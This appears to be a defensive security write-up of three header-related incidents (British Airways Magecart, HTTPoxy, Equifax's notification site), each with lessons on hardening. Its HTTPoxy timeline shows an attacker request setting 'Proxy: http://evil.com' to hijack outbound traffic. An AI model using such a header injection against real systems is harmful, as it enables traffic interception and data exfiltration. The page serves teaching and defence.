# Case Studies

## Case Study 1: British Airways — Magecart (2018)

**Incident:** Attackers compromised British Airways' payment page and injected a card-skimming script hosted on `baways.com`. The script exfiltrated 380,000 payment card details over 15 days.

**Header Analysis:** BA's response headers lacked a strict `Content-Security-Policy`. A well-formed CSP with `script-src 'self'` and hash-based allowances would have prevented the execution of the attacker-controlled script.

**Lesson:** Security headers are not optional decoration; they are a critical layer of defense against supply-chain and injection attacks.

## Case Study 2: HTTPoxy — CGI Proxy Header Injection (CVE-2016-5385)

**Incident:** A vulnerability in RFC 3875 (CGI specification) caused the `Proxy` request header to be translated into the `HTTP_PROXY` environment variable. Applications using this variable for outbound requests were tricked into routing traffic through attacker-controlled proxies.

**Header Analysis:** Applications behind reverse proxies passed the `Proxy` header through without sanitization. This allowed request hijacking, data exfiltration, and SSRF.

**Lesson:** Strip or whitelist headers at the edge. Never pass unvalidated client headers to application context.

## Case Study 3: Equifax Post-Breach Site — Header Hygiene (2017)

**Incident:** After the 2017 breach, Equifax launched a consumer notification site. Security researchers quickly noted that the site:

- Lacked `Strict-Transport-Security`, making it vulnerable to SSL stripping.
- Lacked `Content-Security-Policy`, allowing third-party scripts.
- Served `X-Powered-By: ASP.NET`, leaking stack information.

**Lesson:** Post-incident infrastructure must be hardened with the same rigor as production systems. Information-disclosure headers aid reconnaissance.

## Timeline: HTTPoxy Attack Flow

```
Attacker: ──[Request: Proxy: http://evil.com]──→ CDN / Load Balancer
                                                  │
                                                  └── Passes header through
                                                  │
Application:   CGI / FastCGI sets HTTP_PROXY=http://evil.com
               │
               └── Outbound API call uses HTTP_PROXY
               │
               └── Traffic routed through evil.com
                   (Data exfiltration / SSRF)
```

## References

- CVE-2016-5385
- OWASP: HTTP Headers Cheat Sheet
- SANS: British Airways Magecart Analysis (2018)
- Scott Helme: securityheaders.com scan of Equifax (2017)
